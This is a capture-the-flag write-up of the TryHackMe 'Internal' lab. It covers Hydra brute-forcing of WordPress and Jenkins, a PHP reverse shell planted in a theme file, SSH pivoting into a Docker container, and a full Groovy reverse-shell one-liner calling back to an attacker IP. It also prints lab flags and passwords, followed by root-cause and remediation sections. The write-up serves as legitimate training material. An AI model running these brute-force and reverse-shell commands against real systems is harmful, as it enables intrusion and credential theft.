# Write-up: Internal lab (Hard) on THM

This document is a structured security write-up based on hands-on exploitation of the **Internal** lab on TryHackMe website: https://tryhackme.com/room/internal

**Date**: January 16, 2026  
**Source**: TryHackMe — Internal & Personal Study Notes

---

## Summary

The Internal infrastructure was **fully compromised** through a multi-stage attack vector involving web exploitation, lateral movement, and container pivoting:  
* **Initial Access**: Gained via a brute-force attack on the **WordPress** admin account using Hydra, followed by **RCE** via a malicious PHP theme edit.
* **Lateral Movement**: Discovered plaintext credentials for the user **aubreanna** in a local text file, allowing **SSH access**.
* **Pivoting**: Identified an internal **Jenkins** instance running in a **Docker** container (172.17.0.2). Utilized SSH port forwarding to expose the service and **brute-forced** the Jenkins console.
* **Privilege Escalation**: Executed a Groovy script via the Jenkins Console to gain a reverse shell within the container, where the **root** credentials for the host machine were found in an internal note.

---

## Technical Overview
### 1. Discovery

By first, the regular Nmap scan:  
```bash
$ sudo nmap -sC -sV -v -Pn -p- 10.80.159.216
```

Results:  
<img width="667" height="182" alt="nmap" src="https://github.com/user-attachments/assets/f3c7f962-5968-4922-9495-7edee5c4db6b" />

*Just a regular Linux server. Only the 22/tcp and 80/tcp ports open. Looks like we have to penetrate through 80/tcp http.*

---

Add the domain to /etc/hosts:  
```text
10.80.159.216 internal.thm
```

I'm also going to add the domain to **C:\Windows\System32\drivers\etc\hosts** on my Windows 11 host machine for most compatibility between my WSL2 Kali Linux and Windows 11 host:  
```shell
Start-Process notepad.exe -ArgumentList "C:\Windows\System32\drivers\etc\hosts" -Verb RunAs
```

```text
10.80.159.216 internal.thm
```

---

Navigate to http://internal.thm

<img width="1920" height="975" alt="apache" src="https://github.com/user-attachments/assets/0daa3b12-8c33-4f64-b168-635c6c50b6eb" />

*Default Apache2 web page. No easter eggs in the source code. Nothing interesting in here.*

Going to fuzz it:  
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://internal.thm/FUZZ" -ic -c -r
```

<img width="1242" height="688" alt="fuzz" src="https://github.com/user-attachments/assets/2a4e83b1-0b7e-4f81-b642-826cecdace1b" />

It's our targets:  
* http://internal.thm/blog
* http://internal.thm/phpmyadmin

Navigate to the **blog** page:  
<img width="1920" height="969" alt="blog" src="https://github.com/user-attachments/assets/019da466-35bd-4d9e-ac9c-fce16d8d607b" />

*Some web page on WordPress. No easter eggs in the source code.*

In the bottom of the page see some **Log in** button. wp-login?

<img width="838" height="609" alt="wplogin" src="https://github.com/user-attachments/assets/d5e0ecd1-132d-4302-855e-3fb957881f77" />

Yes. We have the **wp-login.php** here.

<img width="1920" height="971" alt="wpadmin" src="https://github.com/user-attachments/assets/f44491dd-de10-4c5c-8ec5-954371411f9c" />


The /phpmyadmin is also **log-in page**:  
<img width="1920" height="971" alt="phpmyadmin" src="https://github.com/user-attachments/assets/8e2a5efe-acfe-426e-8714-4e4b3a904b29" />

*We have the two log-in pages on this site. Let's check them out on brute-force vulnerability.*

---

### 2. Penetration

Brute it:  
```bash
$ hydra -l 'admin' -P /usr/share/eaphammer/wordlists/rockyou.txt internal.thm http-form-post "/blog/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```

<img width="1920" height="271" alt="wpbrute" src="https://github.com/user-attachments/assets/9c7890da-e693-42bd-bf31-435907f62383" />

Here we go. WordPress admin board credentials:  
```text
admin:my2boys
```

---

<img width="1920" height="970" alt="email" src="https://github.com/user-attachments/assets/eb081b95-4c96-49bf-8183-4995fa68cd31" />

*Remind me later.*

<img width="1920" height="974" alt="wp-page" src="https://github.com/user-attachments/assets/0f74478e-975a-47e4-98a7-ee0817d16649" />

---

Reverse shell it:  
```bash
$ nc -lnvp 4444
```

Put the **pentestmonkey** reverse shell (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to the Appearance -> Theme Editor -> 404.php:  
<img width="1920" height="972" alt="Screenshot (18)" src="https://github.com/user-attachments/assets/a222849e-6383-4de3-8e6b-049d9d9ed871" />

*Update File.*

Navigate to a random non-existent web page to trigger a 404 error:  
http://internal.thm/blog/index.php/qwertyabc123

Here we go.

<img width="1221" height="248" alt="wwwdata" src="https://github.com/user-attachments/assets/75fd9d43-a43b-4b1f-9ffa-855c0acdafc1" />

---

Upgrade it:  
```bash
$ python -c "import pty;pty.spawn('/bin/bash')"
```

**Ctrl+Z**:  
```bash
$ stty raw -echo && fg
```

```text
reset
```

```text
xterm-256color
```

```bash
$ export TERM=xterm-256color
```

---

### 3. Escalation

There is some MYSQL credentials in the PhpMyAdmin's /etc/phpmyadmin/config-db.php:  
```text
$dbuser='phpmyadmin';
$dbpass='B2Ud4fEOZmVq';
```

Also there is some MYSQL credentials in the WordPress' /var/www/html/wordpress/wp-config.php:  
```text
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' );
```

Actually, nothing interesting in the MYSQL databases.

But in the /opt/ direcroty is clearly easter egg for us:  
<img width="1166" height="264" alt="opt1" src="https://github.com/user-attachments/assets/06e5bb45-54a8-4409-a3bf-f325c711a65a" />

```text
aubreanna:bubb13guM!@#123
```

---

```bash
$ su aubreanna
```

<img width="873" height="419" alt="usertxt" src="https://github.com/user-attachments/assets/34973f6c-21fd-441f-81f1-9272c84f88e0" />

**The User Flag**:  
```text
THM{int3rna1_fl4g_1}
```

*The User Flag in our pocket.*

---

```bash
$ cat jenkins.txt
```

jenkins.txt:  
```text
Internal Jenkins service is running on 172.17.0.2:8080
```

Access the docker from our machine:  
```bash
$ ssh -L 1488:172.17.0.2:8080 aubreanna@10.80.159.216
```

Navigate to the page: http://localhost:1488

<img width="1920" height="972" alt="jenkinspage" src="https://github.com/user-attachments/assets/ad58080a-7d33-4bf8-b0c0-16093bef2763" />

The default username for the Jenkins server is **admin**, so try to brute it:  
```bash
$ hydra -I -f -l 'admin' -P /usr/share/eaphammer/wordlists/rockyou.txt localhost -s 1488 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&F:Invalid"
```

<img width="1920" height="293" alt="jenkhydr" src="https://github.com/user-attachments/assets/35fa6515-7056-4afd-81d7-0ed4469354d9" />

The Jenkins admin credentials:  
```text
admin:spongebob
```

```bash
$ nc -lnvp 5555
```

Navigate: Manage Jenkins -> Script Console

Put into the console the Groovy reserse shell from https://www.revshells.com:  
```text
String host="192.168.134.69";int port=5555;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

<img width="1920" height="972" alt="jenkcsl" src="https://github.com/user-attachments/assets/ad6906b6-7155-4a33-ab55-765399fff2a7" />

Here we go:  
<img width="748" height="176" alt="jenkrvs" src="https://github.com/user-attachments/assets/761ff4cf-9e34-4750-996a-7681d91e88d0" />

Upgrade it:  
```bash
$ python -c "import pty;pty.spawn('/bin/bash')"
```

**Ctrl+Z**:  
```bash
$ stty raw -echo && fg
```

```text
reset
```

```text
xterm-256color
```

```bash
$ export TERM=xterm-256color
```

In the /opt/ direcroty is another easter egg for us:  
<img width="1477" height="265" alt="opt2" src="https://github.com/user-attachments/assets/51652e71-bb5b-49c3-bd25-fbad9d758ff0" />

Root credentials:  
```text
root:tr0ub13guM!@#123
```

<img width="737" height="463" alt="root" src="https://github.com/user-attachments/assets/2a3f41f5-92b3-484d-9fb8-277f7b161193" />

**The Root Flag**:  
```text
THM{d0ck3r_d3str0y3r}
```

---

## Security Failures & Root Causes Classification

* **Broken Authentication** — Weak Administrative Credentials — **Critical** Impact — the WordPress administrative account **(admin)** and the Jenkins console were protected by weak passwords vulnerable to simple wordlist-based brute-force attacks.
* **Insecure Configuration** — Malicious File Upload **(RCE)** — **High** Impact — the WordPress "Theme Editor" was enabled, allowing any user with administrative privileges to modify PHP files (like 404.php) and execute arbitrary code on the underlying server.
* **Information Exposure** — Cleartext Credentials in Local Files — **High** Impact — sensitive credentials for the user **aubreanna** and eventually the **root** password were stored in plaintext .txt files within the /opt directory, facilitating immediate lateral movement and privilege escalation.
* **Insecure Network Architecture** — Exposed Internal Services via Docker — **High** Impact — the Jenkins service was bound to a local-only interface within a **Docker** container. While restricted from the outside, the lack of internal authentication/authorization allowed an attacker with local user access to tunnel the service via SSH port forwarding.
* **Insufficient Sandboxing** — Docker-to-Host Information Leak — **High** Impact — sensitive host-level credentials **(the root password)** were accessible from within the Jenkins container's file system, breaking the isolation between the containerized environment and the host machine.

---

## Remediation Recommendations

* **Enforce** Strong Password Policies: Implement complex password requirements and Multi-Factor Authentication (MFA) for all administrative interfaces, including WordPress and Jenkins.
* **Disable** Built-in File Editors: Disable the WordPress Theme and Plugin editors to prevent RCE via the dashboard.
* **Secure** Credential Storage: Prohibit the storage of plaintext passwords in the file system. Use secure secrets management solutions or environment variables with restricted access.
* **Hardened** Container Isolation: Ensure that sensitive host information or credentials are never mounted or stored within Docker containers. Follow the principle of least privilege for container service accounts.
* **Implement** Rate Limiting: Deploy a Web Application Firewall (WAF) or tools like Fail2Ban to detect and block brute-force attempts on login endpoints (/wp-login.php and /j_acegi_security_check).
* **Restrict** SSH Port Forwarding: If not required for business operations, disable SSH tunneling/port forwarding in the sshd_config to prevent attackers from pivoting to internal-only services.

---

## Conclusion

> The compromise of the Internal lab highlights a classic "chain of trust" failure. The attack began with a common entry point (WordPress) and escalated through poor operational security — specifically the storage of plaintext credentials and the presence of unprotected internal services.
>
> The transition from a containerized Jenkins instance to full host root access demonstrates that containers are not a security boundary if they contain the keys to the host machine. True security in this environment would have required not just patching, but a fundamental shift in how secrets are managed and how administrative interfaces are hardened against unauthorized access.

---

*Write-up compiled based on TryHackMe Internal (https://tryhackme.com/room/internal) lab.*
